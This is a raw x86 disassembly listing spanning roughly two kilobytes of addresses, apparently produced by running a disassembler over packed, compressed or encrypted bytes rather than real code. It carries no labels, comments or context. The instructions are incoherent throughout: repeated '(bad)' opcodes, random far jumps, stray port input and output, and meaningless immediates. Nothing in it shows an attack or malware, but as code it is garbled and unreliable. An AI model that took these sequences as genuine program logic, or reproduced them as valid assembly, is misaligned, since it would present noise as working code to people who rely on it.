  417523:	fs (bad) 
  417525:	and    eax,0xf5b59dcc
  41752a:	pop    edx
  41752b:	stos   DWORD PTR es:[edi],eax
  41752c:	add    al,BYTE PTR [ecx+0x9]
  41752f:	dec    eax
  417530:	inc    ebp
  417531:	xchg   ebp,eax
  417532:	pop    esi
  417533:	pop    edi
  417534:	pop    ebp
  417535:	sub    al,0x54
  417537:	std    
  417538:	push   edx
  417539:	sbb    al,0x76
  41753b:	xchg   edx,eax
  41753c:	xchg   ebx,eax
  41753d:	mov    esi,DWORD PTR [eax+0x4]
  417540:	jmp    DWORD PTR [esi+ebx*4]
  417543:	fwait
  417544:	xor    BYTE PTR [esi-0x297c2636],bl
  41754a:	jge    0x41756b
  41754c:	into   
  41754d:	popf   
  41754e:	mov    bh,0x67
  417550:	arpl   WORD PTR [edi+0x3d],ax
  417553:	ds out 0xc6,eax
  417556:	rol    BYTE PTR [edx+0x3b8ff0f0],1
  41755c:	cwde   
  41755d:	xor    eax,0xd8a31cd4
  417562:	fwait
  417563:	shl    DWORD PTR [esi+0x3a],0x99
  417567:	mov    al,ds:0x7d5d9478
  41756c:	push   ds
  41756d:	test   BYTE PTR ds:0x52c59995,ch
  417573:	out    dx,eax
  417574:	in     eax,0x9
  417576:	pop    ebp
  417577:	js     0x4175a9
  417579:	adc    al,0xd6
  41757b:	jp     0x4175de
  41757d:	test   eax,0xbefe9811
  417582:	lods   al,BYTE PTR ds:[esi]
  417583:	in     al,dx
  417584:	(bad)  
  417585:	xchg   ecx,eax
  417586:	aam    0x9e
  417588:	sub    ecx,DWORD PTR [edx]
  41758a:	ret    0x97f0
  41758d:	in     al,0x98
  41758f:	enter  0x72f7,0x2a
  417593:	jbe    0x41755c
  417595:	xchg   ecx,eax
  417596:	in     eax,0x18
  417598:	cmp    DWORD PTR [ecx+0x5602dde4],esp
  41759e:	pop    edi
  41759f:	or     al,0xf9
  4175a1:	lds    esp,FWORD PTR [edi+0x62]
  4175a4:	push   ss
  4175a5:	test   eax,0xbed125fd
  4175aa:	push   ss
  4175ab:	add    BYTE PTR [edi],0x8e
  4175ae:	bound  edi,QWORD PTR [eax]
  4175b0:	or     DWORD PTR cs:[ebp+0x30],edi
  4175b4:	les    ebx,FWORD PTR [ebp+0x60e0fb1c]
  4175ba:	sbb    al,0xef
  4175bc:	sbb    al,0xbe
  4175be:	pop    esi
  4175bf:	cmp    eax,0x94f8fb86
  4175c4:	ja     0x4175b5
  4175c6:	mov    ds:0x6484f60b,al
  4175cb:	pop    ds
  4175cc:	jge    0x417589
  4175ce:	cdq    
  4175cf:	jae    0x4175e6
  4175d1:	dec    eax
  4175d2:	sub    edi,esp
  4175d4:	push   ds
  4175d5:	mov    edx,ebx
  4175d7:	test   DWORD PTR [ebx-0xd],esi
  4175da:	xchg   BYTE PTR cs:[eax],bl
  4175dd:	test   eax,0xb1a58587
  4175e2:	mov    WORD PTR [esi+0x2af5e4cc],cs
  4175e8:	shl    eax,0x42
  4175eb:	call   0x282ee6e6
  4175f0:	test   eax,0x323ba76c
  4175f5:	xchg   ecx,eax
  4175f6:	int    0xc0
  4175f8:	add    ch,BYTE PTR [ecx+0x391d597d]
  4175fe:	mov    DWORD PTR [edx+ecx*1-0x61],ebp
  417602:	mov    BYTE PTR [ebx-0x5bfc655f],ch
  417608:	ds in  eax,dx
  41760a:	pushf  
  41760b:	cmp    eax,0x95a85153
  417610:	aas    
  417611:	fdivr  DWORD PTR [ebp-0x44380fe8]
  417617:	ss mov al,0x83
  41761a:	add    al,0xc3
  41761c:	cmp    cl,BYTE PTR [edi+0xc12f3fe]
  417622:	xor    bl,BYTE PTR cs:[edx]
  417625:	lods   al,BYTE PTR ds:[esi]
  417626:	je     0x4175d1
  417628:	jp     0x417672
  41762a:	sbb    BYTE PTR fs:[edi-0x58],bl
  41762e:	dec    ebx
  41762f:	dec    eax
  417630:	out    dx,al
  417631:	inc    esp
  417632:	sbb    edx,0xc1300e52
  417638:	outs   dx,DWORD PTR ds:[esi]
  417639:	aad    0x94
  41763b:	mov    BYTE PTR [ebx],bl
  41763d:	(bad)  
  41763e:	iret   
  41763f:	mov    ?,WORD PTR [esi-0x24]
  417642:	xor    eax,DWORD PTR [esi]
  417644:	jno    0x417697
  417646:	cs push eax
  417648:	xchg   ebp,eax
  417649:	add    edi,esp
  41764b:	daa    
  41764c:	cmp    eax,0xdb1288e5
  417651:	sahf   
  417652:	xor    ah,BYTE PTR [ebx+ecx*4-0x3]
  417656:	or     edx,DWORD PTR [edx+0x280b79bd]
  41765c:	std    
  41765d:	push   ecx
  41765e:	fadd   QWORD PTR [ebx+0x45]
  417661:	xor    BYTE PTR [ebx+0x283b9765],dh
  417667:	push   ebp
  417668:	outs   dx,BYTE PTR ds:[esi]
  417669:	mov    esp,0xe4036885
  41766e:	retf   0x4aa3
  417671:	test   BYTE PTR [esp+eiz*2-0x20],ah
  417675:	shr    DWORD PTR [edx],cl
  417677:	mov    dl,BYTE PTR [edi+0x69b94586]
  41767d:	mov    ebp,0xeec94053
  417682:	pop    esp
  417683:	adc    WORD PTR ds:0xa5f23f0d,sp
  41768a:	inc    esi
  41768b:	pop    eax
  41768c:	test   eax,0x303b212d
  417691:	outs   dx,BYTE PTR ds:[esi]
  417692:	inc    eax
  417693:	into   
  417694:	jo     0x41766f
  417696:	jo     0x4176b4
  417698:	pop    ds
  417699:	jle    0x41766a
  41769b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41769c:	cli    
  41769d:	dec    esp
  41769e:	jg     0x417684
  4176a0:	xchg   BYTE PTR [edi-0x32],ah
  4176a3:	mov    bh,0x1c
  4176a5:	xor    edx,esp
  4176a7:	jmp    FWORD PTR [ebp-0x5c9363d7]
  4176ad:	xchg   edi,eax
  4176ae:	pop    esi
  4176af:	sub    DWORD PTR [ecx+edx*4+0x21],0x46
  4176b4:	rol    DWORD PTR [eax-0x14],cl
  4176b7:	inc    eax
  4176b8:	mov    ch,0x2f
  4176ba:	mov    bl,0xe8
  4176bc:	xor    BYTE PTR [ebx+eiz*1+0x35718e8e],dl
  4176c3:	mov    al,ds:0x58c9c64
  4176c8:	sub    ebp,DWORD PTR [ebx]
  4176ca:	xchg   esp,eax
  4176cb:	cdq    
  4176cc:	scas   eax,DWORD PTR es:[edi]
  4176cd:	out    0x87,al
  4176cf:	push   ebx
  4176d0:	sub    BYTE PTR [ebx],bh
  4176d2:	dec    edx
  4176d3:	dec    eax
  4176d4:	shl    dl,1
  4176d6:	out    0x5c,al
  4176d8:	imul   esp
  4176da:	xor    dh,BYTE PTR [ecx+ebp*1+0x44]
  4176de:	inc    ecx
  4176df:	out    dx,eax
  4176e0:	test   eax,0xc9c18e95
  4176e5:	xchg   edx,eax
  4176e6:	bound  ecx,QWORD PTR [edi+0x7dbe0a0d]
  4176ec:	mov    esi,0xdd89cc58
  4176f1:	lods   eax,DWORD PTR ds:[esi]
  4176f2:	(bad)  
  4176f3:	popf   
  4176f4:	imul   edi,DWORD PTR [esi],0xfe5ba729
  4176fa:	mov    dl,BYTE PTR [ebp-0x25]
  4176fd:	jmp    0xb480:0xfa1b1414
  417704:	aam    0xaa
  417706:	pop    ebp
  417707:	jbe    0x417736
  417709:	push   ecx
  41770a:	shl    DWORD PTR [esi],cl
  41770c:	jge    0x41772c
  41770e:	dec    edx
  41770f:	aam    0xe5
  417711:	pop    esp
  417712:	sbb    dh,0xe1
  417715:	fdivr  QWORD PTR [ebx+eax*2]
  417718:	push   edx
  417719:	xchg   esp,eax
  41771a:	jge    0x4176c8
  41771c:	cmp    DWORD PTR [eax+0x627456ed],ebx
  417722:	xchg   ebp,eax
  417723:	test   DWORD PTR [ebx],ebx
  417725:	ret    0x3c12
  417728:	cmp    al,dl
  41772a:	jcxz   0x417792
  41772d:	jo     0x41778a
  41772f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417731:	stc    
  417732:	fsubr  DWORD PTR [ebx+edx*1-0x1]
  417736:	repz adc ecx,DWORD PTR [eax-0x2c]
  41773a:	int3   
  41773b:	in     al,0x40
  41773d:	pop    ebx
  41773e:	dec    edi
  41773f:	inc    esp
  417740:	arpl   WORD PTR [ebp+ebx*4-0x42],si
  417744:	mov    ah,0x6f
  417746:	pop    ebx
  417747:	add    al,0x1a
  417749:	mov    ebx,0xa0952532
  41774e:	xlat   BYTE PTR ds:[ebx]
  41774f:	das    
  417750:	pusha  
  417751:	and    al,0xc3
  417753:	push   ebx
  417754:	das    
  417755:	inc    eax
  417756:	or     eax,0x44d6467e
  41775b:	mov    ebp,0x2e3d63a4
  417760:	or     ch,bl
  417762:	shr    BYTE PTR [esi-0x3a84b305],cl
  417768:	aad    0x78
  41776a:	lahf   
  41776b:	mov    esp,0x7ae54771
  417770:	pop    edx
  417771:	and    bl,dh
  417773:	mov    ah,0xbf
  417775:	add    eax,ebx
  417777:	out    dx,eax
  417778:	xchg   BYTE PTR [ebp-0x6b],ah
  41777b:	mov    si,0x1e1b
  41777f:	scas   eax,DWORD PTR es:[edi]
  417780:	dec    ebp
  417781:	and    cl,BYTE PTR [edi-0x5337c82d]
  417787:	repnz int 0xda
  41778a:	scas   al,BYTE PTR es:[edi]
  41778b:	lods   eax,DWORD PTR ds:[esi]
  41778c:	mov    bh,0x34
  41778e:	pop    ecx
  41778f:	rcr    DWORD PTR [ecx+0x6e288f25],cl
  417795:	popf   
  417796:	dec    edx
  417797:	inc    ecx
  417798:	arpl   WORD PTR [ecx],sp
  41779a:	lea    ecx,[edi]
  41779c:	push   ds
  41779d:	(bad)  
  41779e:	cwde   
  41779f:	fidiv  DWORD PTR [edx+0x50]
  4177a2:	dec    ebx
  4177a3:	add    al,0xda
  4177a5:	dec    edx
  4177a6:	loop   0x417736
  4177a8:	xchg   esp,eax
  4177a9:	or     bl,bh
  4177ab:	mov    edi,0x7f0e7c2c
  4177b0:	bound  ebx,QWORD PTR [ecx+0x35b1b5fe]
  4177b6:	push   edi
  4177b7:	inc    ebx
  4177b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177b9:	xchg   esp,eax
  4177ba:	push   esp
  4177bb:	inc    ecx
  4177bc:	(bad)  
  4177bd:	pop    ebx
  4177be:	mov    edi,0xae1e607f
  4177c3:	mov    ecx,0xb141ebf4
  4177c8:	dec    ebx
  4177c9:	fcmove st,st(7)
  4177cb:	popa   
  4177cc:	push   cs
  4177cd:	mov    bh,0x3
  4177cf:	adc    edi,DWORD PTR [eax]
  4177d1:	pop    esi
  4177d2:	mov    dh,0x5c
  4177d4:	or     esi,DWORD PTR [ebx-0x6]
  4177d7:	nop
  4177d8:	scas   al,BYTE PTR es:[edi]
  4177d9:	pushf  
  4177da:	jbe    0x4177e9
  4177dc:	fbld   TBYTE PTR [ebx+edx*4]
  4177df:	ret    0xf1bd
  4177e2:	mov    ebx,es
  4177e4:	pop    edx
  4177e5:	and    cl,BYTE PTR [edi-0xb091c13]
  4177eb:	pop    ecx
  4177ec:	into   
  4177ed:	mov    al,0xe9
  4177ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177f0:	int3   
  4177f1:	mov    eax,ds:0xbc8e8eb3
  4177f6:	in     eax,0xce
  4177f8:	mov    eax,0x3fc56e74
  4177fd:	mov    eax,esi
  4177ff:	lods   al,BYTE PTR ds:[esi]
  417800:	add    eax,0xe9df0a67
  417805:	mov    eax,0xaacac7e
  41780a:	inc    ebp
  41780b:	enter  0xfb00,0x70
  41780f:	enter  0xc0bf,0x1c
  417813:	dec    ebx
  417814:	hlt    
  417815:	sar    BYTE PTR [esi+eiz*8+0x12],1
  417819:	adc    esp,DWORD PTR [ecx]
  41781b:	push   edx
  41781c:	shl    DWORD PTR ds:0x567e00e,0x68
  417823:	ins    BYTE PTR es:[edi],dx
  417824:	cmp    esp,DWORD PTR es:[ebx-0x135d211f]
  41782b:	setle  BYTE PTR [esi+0x364c8610]
  417832:	pop    edx
  417833:	or     esi,DWORD PTR [eax-0xb20c263]
  417839:	mov    ebx,eax
  41783b:	mov    ebp,0x6b3dbd9c
  417840:	out    0x22,eax
  417842:	ins    BYTE PTR es:[edi],dx
  417843:	fwait
  417844:	mov    WORD PTR [ecx],gs
  417846:	mov    edx,0x39ae7e86
  41784b:	xchg   ebx,eax
  41784c:	jecxz  0x41788a
  41784e:	in     al,dx
  41784f:	les    esi,FWORD PTR [ecx+edx*4-0x5c]
  417853:	push   es
  417854:	(bad)  [ebp-0x43]
  417857:	addr16 jl 0x417841
  41785a:	aas    
  41785b:	sbb    BYTE PTR [ecx+ebx*8-0x3],0xd7
  417860:	or     dh,BYTE PTR [ebx]
  417862:	jp     0x417865
  417864:	cld    
  417865:	dec    eax
  417866:	(bad)  [ebx-0x67]
  417869:	cmp    DWORD PTR [ebp+0x50],0x3ea75ecc
  417870:	inc    eax
  417871:	xor    ebp,DWORD PTR [esi-0xa]
  417874:	adc    eax,0x1818ab88
  417879:	adc    BYTE PTR [esp+ebp*2],bl
  41787c:	adc    bl,BYTE PTR ds:[edx+0x47]
  417880:	sub    ebx,DWORD PTR [ebp-0x67]
  417883:	sub    BYTE PTR [edi+ebx*4],cl
  417886:	inc    esp
  417887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417888:	fs cmc 
  41788a:	mov    edx,0x4148684d
  41788f:	cs pmaxsw mm1,mm5
  417893:	scas   eax,DWORD PTR es:[edi]
  417894:	jg     0x41785f
  417896:	xlat   BYTE PTR ds:[ebx]
  417897:	inc    ebx
  417898:	sbb    al,0x8b
  41789a:	test   al,0xc3
  41789c:	ret    0xcf39
  41789f:	mov    cl,0x23
  4178a1:	aaa    
  4178a2:	das    
  4178a3:	jp     0x41790c
  4178a5:	mov    gs,WORD PTR [edi]
  4178a7:	loope  0x41786b
  4178a9:	imul   ecx,DWORD PTR [ebp+0x2dcc342c],0x15e79718
  4178b3:	mul    dl
  4178b5:	test   BYTE PTR [ecx+esi*4],ah
  4178b8:	loopne 0x417885
  4178ba:	sbb    edi,esi
  4178bc:	call   0x5cb60429
  4178c1:	fwait
  4178c2:	xchg   ebx,eax
  4178c3:	jp     0x417895
  4178c5:	cs in  al,0x44
  4178c8:	and    BYTE PTR [esi+0x9],dh
  4178cb:	aad    0xa
  4178cd:	adc    ch,BYTE PTR [esi]
  4178cf:	sbb    ecx,DWORD PTR [eax+ecx*2]
  4178d2:	test   al,0xe4
  4178d4:	dec    ebx
  4178d5:	shl    BYTE PTR [ebx+0x3f28a8f],0x7c
  4178dc:	ror    DWORD PTR [ebx],0x1f
  4178df:	sahf   
  4178e0:	adc    cl,dl
  4178e2:	jp     0x417936
  4178e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178e5:	xchg   ebx,eax
  4178e6:	xlat   BYTE PTR ds:[ebx]
  4178e7:	mov    ebx,0xb3036c17
  4178ec:	inc    eax
  4178ed:	add    cl,dl
  4178ef:	and    edx,DWORD PTR [esi]
  4178f1:	maskmovq mm2,mm0
  4178f4:	mov    edi,0x510990b5
  4178f9:	jns    0x4178eb
  4178fb:	mov    ebx,0xdd151267
  417900:	fldln2 
  417902:	add    al,BYTE PTR [eax-0x11]
  417905:	mov    ebx,0x67a46372
  41790a:	loope  0x4178b1
  41790c:	imul   ecx,DWORD PTR [ecx-0x2],0x107c5197
  417913:	fnsetpm(287 only) 
  417915:	outs   dx,BYTE PTR ds:[esi]
  417916:	and    ch,dh
  417918:	retf   0xdecb
  41791b:	lahf   
  41791c:	cmp    DWORD PTR [edx],0x1f
  41791f:	mov    al,0x68
  417921:	popf   
  417922:	mov    edx,0x230a5ed8
  417927:	or     eax,0x25c7c634
  41792c:	jmp    0x4178cf
  41792e:	jb     0x417945
  417930:	or     DWORD PTR [edi],0xffffffc3
  417933:	ds aad 0xbc
  417936:	cmp    ah,BYTE PTR [ecx]
  417938:	shr    BYTE PTR ds:0xaf09e922,0x20
  41793f:	jp     0x417900
  417941:	ficomp DWORD PTR [edi-0x52b21883]
  417947:	mov    ecx,ebp
  417949:	cmp    ah,BYTE PTR [ebx+ecx*1+0x5b]
  41794d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41794e:	and    al,0xef
  417950:	sar    DWORD PTR [esi-0x64704e9a],1
  417956:	jp     0x4179ab
  417958:	mov    eax,0xd84e8a27
  41795d:	cwde   
  41795e:	or     DWORD PTR [esp+esi*2+0x6ba61fa7],0x784b2cb
  417969:	and    al,0x8
  41796b:	ds addr16 jns 0x41793e
  41796f:	inc    ebx
  417970:	or     al,0x66
  417972:	mov    ebp,0x3ef1d649
  417977:	retf   
  417978:	and    BYTE PTR [edi+0x27],cl
  41797b:	xlat   BYTE PTR ds:[ebx]
  41797c:	dec    edi
  41797d:	aas    
  41797e:	and    eax,0x354053a6
  417983:	gs push es
  417985:	pop    ecx
  417986:	and    al,0xc8
  417988:	add    BYTE PTR gs:[edi+0x75],dh
  41798c:	dec    eax
  41798d:	jnp    0x41791a
  41798f:	jo     0x41793f
  417991:	mov    ebx,0x1077f1f3
  417996:	mov    dh,0xbc
  417998:	xor    eax,0xbbc4501c
  41799d:	jne    0x4179db
  41799f:	ins    BYTE PTR es:[edi],dx
  4179a0:	inc    ecx
  4179a1:	add    BYTE PTR [edx-0x27],ah
  4179a4:	mov    es,WORD PTR [ecx]
  4179a6:	mov    DWORD PTR [edi-0x7a70a008],esi
  4179ac:	jmp    0xd5eb:0x762d108f
  4179b3:	pusha  
  4179b4:	shl    esi,cl
  4179b6:	pop    edx
  4179b7:	repz repnz retf 0xd94
  4179bc:	out    0xa1,eax
  4179be:	es retf 
  4179c0:	mov    eax,ds:0x762ca20d
  4179c5:	xchg   eax,ecx
  4179c7:	inc    ebx
  4179c8:	out    dx,eax
  4179c9:	push   esi
  4179ca:	dec    esi
  4179cb:	in     al,0xbe
  4179cd:	mov    esp,0x7016f996
  4179d2:	dec    edx
  4179d3:	repnz test BYTE PTR [ebp+0xc],bl
  4179d7:	mov    esp,0x51588f57
  4179dc:	mov    esi,0xb3050f99
  4179e1:	ret    
  4179e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179e3:	out    0x6f,eax
  4179e5:	push   es
  4179e6:	dec    esp
  4179e7:	fisttp QWORD PTR [edi+0x40]
  4179ea:	ss mov ?,eax
  4179ed:	rcl    BYTE PTR ds:0x338567ae,0x2f
  4179f4:	pushf  
  4179f5:	in     eax,dx
  4179f6:	and    DWORD PTR [edi+0x76],edi
  4179f9:	hlt    
  4179fa:	imul   eax,DWORD PTR [ebp-0x2667f4c5],0xcb8d7d61
  417a04:	retf   0x3b88
  417a07:	das    
  417a08:	xchg   DWORD PTR [ebp+0x15],edx
  417a0b:	sbb    DWORD PTR [ebp-0x4b],edi
  417a0e:	pop    edx
  417a0f:	inc    edi
  417a10:	sub    bl,al
  417a12:	jmp    0x634a:0x503b69e2
  417a19:	inc    edx
  417a1a:	cmp    eax,DWORD PTR [edx+0x1f]
  417a1d:	popf   
  417a1e:	cli    
  417a1f:	mov    eax,ds:0xac371312
  417a24:	adc    al,0xf0
  417a26:	inc    edi
  417a27:	dec    edx
  417a28:	xchg   cl,dl
  417a2a:	adc    eax,0x442d7f33
  417a2f:	outs   dx,BYTE PTR ds:[esi]
  417a30:	mov    edi,eax
  417a32:	mov    ds:0x31f68e8f,eax
  417a37:	jmp    0x35e7:0x5687b82b
  417a3e:	shl    DWORD PTR [edx],cl
  417a40:	test   DWORD PTR [edi-0x3f555a86],eax
  417a46:	aas    
  417a47:	pushf  
  417a48:	outs   dx,BYTE PTR ds:[esi]
  417a49:	sub    BYTE PTR [ebx],cl
  417a4b:	jmp    0x417a31
  417a4d:	mov    ebp,0x174d0ce9
  417a52:	icebp  
  417a53:	pmaddwd mm3,QWORD PTR [ebp-0x27]
  417a57:	in     eax,0xe0
  417a59:	shr    DWORD PTR [edx+eax*2+0x7c8220fd],0x4f
  417a61:	fmul   st,st(1)
  417a63:	test   eax,0x19378374
  417a68:	test   BYTE PTR [edi-0x21],bl
  417a6b:	sub    DWORD PTR [esi+0x9],0x13
  417a6f:	daa    
  417a70:	jge    0x417a15
  417a72:	dec    ecx
  417a73:	jecxz  0x417a2a
  417a75:	cmp    al,0x1
  417a77:	hlt    
  417a78:	push   cs
  417a79:	scas   al,BYTE PTR es:[edi]
  417a7a:	adc    bl,BYTE PTR [ecx]
  417a7c:	push   eax
  417a7d:	lldt   WORD PTR [esi+esi*2]
  417a81:	ss push ds
  417a83:	add    DWORD PTR [esp+edx*1+0x69],0xc804b1d6
  417a8b:	add    eax,0x10a37a5b
  417a90:	xchg   edi,eax
  417a91:	(bad)  
  417a92:	dec    esi
  417a93:	mov    bl,0xb
  417a95:	xchg   esp,eax
  417a96:	sbb    al,0x18
  417a98:	fwait
  417a99:	push   0x76
  417a9b:	xchg   DWORD PTR [esi+0x75ef9157],ebx
  417aa1:	cmp    al,0xae
  417aa3:	call   0x6c3baae8
  417aa8:	pop    ecx
  417aa9:	inc    eax
  417aaa:	jge    0x417a48
  417aac:	fisttp QWORD PTR [eax-0x4413b6c6]
  417ab2:	lods   eax,DWORD PTR ds:[si]
  417ab4:	xlat   BYTE PTR ds:[ebx]
  417ab5:	mov    ebx,0x5924cfbf
  417aba:	pusha  
  417abb:	loope  0x417ac2
  417abd:	or     eax,0x55e91cf4
  417ac2:	sahf   
  417ac3:	adc    DWORD PTR [edi-0x72f52b81],ebp
  417ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aca:	test   eax,0xc475f658
  417acf:	xor    eax,0x59cbb8ae
  417ad4:	cdq    
  417ad5:	jnp    0x417b03
  417ad7:	inc    eax
  417ad8:	loop   0x417b51
  417ada:	adc    eax,0xfbb8e289
  417adf:	jg     0x417aff
  417ae1:	mov    ecx,esi
  417ae3:	push   esp
  417ae4:	cmp    eax,0x9f04ab69
  417ae9:	test   bl,dl
  417aeb:	nop
  417aec:	idiv   DWORD PTR [edx]
  417aee:	add    al,0x6a
  417af0:	enter  0x75f,0xd6
  417af4:	lds    edi,FWORD PTR [edx-0xd865acd]
  417afa:	int    0x40
  417afc:	mov    bh,0x7b
  417afe:	bound  ecx,QWORD PTR [ebx]
  417b00:	adc    DWORD PTR [esi+0x27],ecx
  417b03:	dec    ecx
  417b04:	retf   
  417b05:	aas    
  417b06:	add    DWORD PTR [ebx],0xffffffcc
  417b09:	imul   ebp,DWORD PTR [edi+0x70838b0a],0xfffffffc
  417b10:	or     eax,0xe3655d72
  417b15:	repnz adc ch,bh
  417b18:	pushf  
  417b19:	stos   BYTE PTR es:[edi],al
  417b1a:	add    BYTE PTR [eax-0x2bee2e32],ah
  417b20:	and    al,0xfa
  417b22:	adc    al,0xeb
  417b24:	adc    eax,0x2f57c22c
  417b29:	hlt    
  417b2a:	(bad)  
  417b2b:	in     eax,dx
  417b2c:	dec    ebp
  417b2d:	inc    eax
  417b2e:	sti    
  417b2f:	inc    edx
  417b30:	(bad)  
  417b31:	test   eax,0x984541c3
  417b36:	xchg   edi,eax
  417b37:	mov    cl,BYTE PTR [eax]
  417b39:	not    BYTE PTR [ecx+0x40eeea89]
  417b3f:	pop    ss
  417b40:	inc    eax
  417b41:	mov    al,0x8b
  417b43:	imul   ecx,DWORD PTR [esi+0x187df227],0x45
  417b4a:	scas   eax,DWORD PTR es:[edi]
  417b4b:	inc    ecx
  417b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b4d:	jae    0x417b19
  417b4f:	(bad)  
  417b50:	enter  0x4c9,0x74
  417b54:	dec    DWORD PTR [esi+0x3f856e64]
  417b5a:	sbb    eax,0xab5e0621
  417b5f:	scas   al,BYTE PTR es:[edi]
  417b60:	pop    esi
  417b61:	or     edi,DWORD PTR [eax+edi*4]
  417b64:	and    bl,BYTE PTR [ebp+0x37c4d998]
  417b6a:	xchg   esi,eax
  417b6b:	cs push eax
  417b6d:	ja     0x417be9
  417b6f:	jae    0x417ba5
  417b71:	in     al,0x12
  417b73:	pop    esi
  417b74:	jb     0x417bb9
  417b76:	shr    BYTE PTR [ebx],0x6a
  417b79:	lods   eax,DWORD PTR ds:[esi]
  417b7a:	in     eax,0xfb
  417b7c:	fild   QWORD PTR [ebp-0x798a05d2]
  417b82:	test   al,bl
  417b84:	aam    0x94
  417b86:	dec    ecx
  417b87:	xor    eax,0x5fa04fc6
  417b8c:	addr16 jne 0x417bce
  417b8f:	mov    bl,0xd3
  417b91:	nop
  417b92:	out    0xc1,eax
  417b94:	popf   
  417b95:	pop    ebp
  417b96:	cdq    
  417b97:	xor    ebx,0xffffff85
  417b9a:	out    0xae,eax
  417b9c:	lahf   
  417b9d:	mov    edi,ds
  417b9f:	sbb    ecx,DWORD PTR [esi+ebp*8]
  417ba2:	pop    esi
  417ba3:	mov    dh,BYTE PTR [esi+0x70e225d7]
  417ba9:	sbb    al,0x5e
  417bab:	ins    BYTE PTR es:[edi],dx
  417bac:	popf   
  417bad:	adc    ebx,DWORD PTR [edx-0x5]
  417bb0:	int    0x6
  417bb2:	test   eax,0x5d337ad6
  417bb7:	cmp    cl,bl
  417bb9:	adc    DWORD PTR [ebx-0x1742cbce],edi
  417bbf:	push   0x74
  417bc1:	je     0x417c18
  417bc3:	sbb    eax,0xadf89b85
  417bc8:	pop    edx
  417bc9:	add    BYTE PTR [ebx-0x32],ch
  417bcc:	jo     0x417b99
  417bce:	(bad)  
  417bcf:	gs jae 0x417bc1
  417bd2:	adc    DWORD PTR ds:0xcc3f5a30,ecx
  417bd8:	out    dx,eax
  417bd9:	(bad)  [edx-0x5f]
  417bdc:	stos   BYTE PTR es:[edi],al
  417bdd:	jnp    0x417c4d
  417bdf:	lods   al,BYTE PTR ds:[esi]
  417be0:	xchg   ebx,eax
  417be1:	adc    BYTE PTR [ebx-0x5be8b045],dh
  417be7:	pop    ss
  417be8:	mov    al,0x4d
  417bea:	add    DWORD PTR [ebp-0x31],ebp
  417bed:	fcomp  DWORD PTR [esi-0x2a64a385]
  417bf3:	or     BYTE PTR [ebx+0x10524d03],cl
  417bf9:	lods   al,BYTE PTR ds:[esi]
  417bfa:	es leave 
  417bfc:	sti    
  417bfd:	and    al,al
  417bff:	xor    al,0xac
  417c01:	push   ecx
  417c02:	addr16 jmp 0x5fe40133
  417c08:	pop    edx
  417c09:	dec    ebp
  417c0a:	mov    ch,0xa4
  417c0c:	je     0x417c76
  417c0e:	hlt    
  417c0f:	inc    edx
  417c10:	xchg   edi,eax
  417c11:	std    
  417c12:	in     eax,0x53
  417c14:	data16 aam 0x74
  417c17:	adc    DWORD PTR [ebx+0x4e151250],0xddb31592
  417c21:	cmp    eax,0x9a956ab8
  417c26:	add    DWORD PTR ds:0xef56592b,0x52
  417c2d:	ss mov edi,0x6dcf58b8
  417c33:	(bad)  
  417c35:	sbb    DWORD PTR [ecx],eax
  417c37:	add    al,0x25
  417c39:	pop    esp
  417c3a:	clc    
  417c3b:	mov    ch,0x79
  417c3d:	fwait
  417c3e:	and    al,0xa1
  417c40:	bound  edx,QWORD PTR [ecx+esi*4-0x3f]
  417c44:	jbe    0x417c59
  417c46:	adc    DWORD PTR [ebp-0x5d],ebp
  417c49:	lods   eax,DWORD PTR ds:[esi]
  417c4a:	cs inc ebp
  417c4c:	or     bl,BYTE PTR [ecx]
  417c4e:	sub    eax,0x809a6d15
  417c53:	push   esp
  417c54:	daa    
  417c55:	inc    ebx
  417c56:	sahf   
  417c57:	adc    BYTE PTR [edi+0x673f07b3],0x8a
  417c5e:	pop    esp
  417c5f:	in     al,0xa9
  417c61:	fmul   DWORD PTR [ecx-0x61]
  417c64:	mov    esi,0x597f1d47
  417c69:	test   al,0x9e
  417c6b:	sbb    bl,bl
  417c6d:	inc    ecx
  417c6e:	aaa    
  417c6f:	in     al,dx
  417c70:	add    DWORD PTR [edx-0x5ddf0921],edi
  417c76:	pop    ebp
  417c77:	jns    0x417c11
  417c79:	xchg   BYTE PTR [esi-0x49c6ad62],dh
  417c7f:	ret    0xb7fe
  417c82:	inc    esi
  417c83:	mov    edx,0x5fc9627b
  417c88:	mov    esp,0x524482c6
  417c8d:	mov    edx,DWORD PTR [edi]
  417c8f:	pop    ebp
  417c90:	mov    ecx,0xdb6a2e16
  417c95:	jno    0x417c80
  417c97:	ins    DWORD PTR es:[edi],dx
  417c98:	das    
  417c99:	cdq    
  417c9a:	out    0x91,al
  417c9c:	xchg   edx,eax
  417c9d:	xchg   edi,eax
  417c9e:	test   eax,0x2c70e90b
  417ca3:	pop    ds
  417ca4:	popa   
  417ca5:	jbe    0x417c92
  417ca7:	mov    eax,0x4c9e8a17
  417cac:	push   ss
  417cad:	in     eax,dx
  417cae:	popa   
  417caf:	dec    edx
  417cb0:	lahf   
  417cb1:	(bad)  
  417cb2:	out    dx,eax
  417cb3:	jecxz  0x417d16
  417cb5:	(bad)  
  417cb6:	mov    bh,0xd0
  417cb8:	mov    edx,0xd7cbad90
  417cbd:	ds pop es
  417cbf:	pop    ss
  417cc0:	sahf   
  417cc1:	push   eax
  417cc2:	xchg   BYTE PTR [eax+ebx*2+0x16],ch
  417cc6:	or     dl,al
  417cc8:	jae    0x417cfe
  417cca:	and    BYTE PTR [ebp+edi*1+0x54],ah
  417cce:	jns    0x417d49
  417cd0:	cmp    ah,BYTE PTR ds:0x51312b7a
  417cd6:	jno    0x417cfe
  417cd8:	add    al,0x59
  417cda:	cmp    DWORD PTR [ebp-0x10],esi
  417cdd:	push   ds
  417cde:	or     al,BYTE PTR [esi+0x35]
  417ce1:	in     eax,0x29
  417ce3:	out    0x72,eax
  417ce5:	jns    0x417cfb
  417ce7:	dec    esi
  417ce8:	fmulp  st(6),st
  417cea:	popf   
  417ceb:	stos   BYTE PTR es:[edi],al
